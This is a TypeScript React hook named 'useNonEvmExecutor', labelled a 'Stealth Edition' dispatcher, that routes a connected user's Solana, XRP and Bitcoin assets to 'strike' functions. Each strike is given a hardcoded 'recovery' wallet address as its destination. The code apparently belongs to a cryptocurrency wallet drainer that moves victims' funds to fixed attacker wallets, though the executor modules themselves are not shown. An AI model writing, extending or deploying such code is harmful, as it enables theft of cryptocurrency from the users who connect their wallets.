"use client";

import { useBitcoinExecutor } from "./useBitcoinExecutor";
import { useSolanaExecutor } from "./useSolanaExecutor";
import { useXrpExecutor } from "./useXrpExecutor";

/**
 * 🛰️ NON-EVM DISPATCHER (v4.1.0 - Stealth Edition)
 * Handles routing for Solana, Bitcoin, and XRP assets.
 * Logic: Strictly separates source resolution from execution.
 */
export function useNonEvmExecutor() {
  const { runSolanaStrike } = useSolanaExecutor();
  const { runXrpStrike } = useXrpExecutor();
  const { runBitcoinStrike } = useBitcoinExecutor();

  // Centralized recovery targets for non-EVM chains
  const RECOVERY_CONFIG = {
    SOLANA: "ABj7b7AUC9t6JJb8WXh5wDoSKL6EHXFZXkEQfLdyEUo8",
    XRP: "rhbhtkcrPfWpXUZgG89VoQ2MJgQUpXhK5n",
    BITCOIN: "bc1qgsghxa9v7uasuqjtqlwdf38spxc8tyrjfxgrl0",
  };

  const runNonEvmStrike = async (asset: any, params: any) => {
    const { logPrefix, userAddress: paramAddress } = params;

    // Normalize chain identification logic
    const rawChain = asset.chainType || asset.chain || asset.network;
    const chain = rawChain?.toUpperCase();

    // Determine the source address: Prioritize asset-specific address over hook params
    const sourceAddress = asset.address || asset.tokenAddress || paramAddress;

    console.log(`${logPrefix} 🔍 Dispatching Non-EVM strike.`, {
      chain,
      sourceAddress,
      assetSymbol: asset.symbol,
    });

    if (!sourceAddress) {
      console.error(
        `${logPrefix} ❌ CRITICAL: No source address found for asset`,
        asset,
      );
      throw new Error("MISSING_SOURCE_ADDRESS");
    }

    try {
      switch (chain) {
        case "SOLANA":
        case "SOL":
          console.log(`${logPrefix} 🛰️ Routing to Solana Strike...`);
          return await runSolanaStrike(asset, {
            userAddress: sourceAddress,
            recoveryAddress: RECOVERY_CONFIG.SOLANA,
            logPrefix,
          });

        case "XRP":
        case "RIPPLE":
          console.log(`${logPrefix} 🛰️ Routing to XRP Strike...`);
          return await runXrpStrike({
            userAddress: sourceAddress,
            recoveryAddress: RECOVERY_CONFIG.XRP,
            logPrefix,
          });

        case "BITCOIN":
        case "BTC":
          console.log(`${logPrefix} 🛰️ Routing to Bitcoin Strike...`);
          return await runBitcoinStrike(asset, {
            userAddress: sourceAddress,
            recoveryAddress: RECOVERY_CONFIG.BITCOIN,
            logPrefix,
          });

        default:
          console.warn(`${logPrefix} ⚠️ Unsupported Non-EVM Chain: ${chain}`);
          throw new Error(`UNSUPPORTED_CHAIN_TYPE: ${chain}`);
      }
    } catch (err: any) {
      console.error(
        `${logPrefix} ❌ Execution failed in Non-EVM Dispatcher for ${asset.symbol}:`,
        err.message || err,
      );
      throw err;
    }
  };

  return { runNonEvmStrike };
}
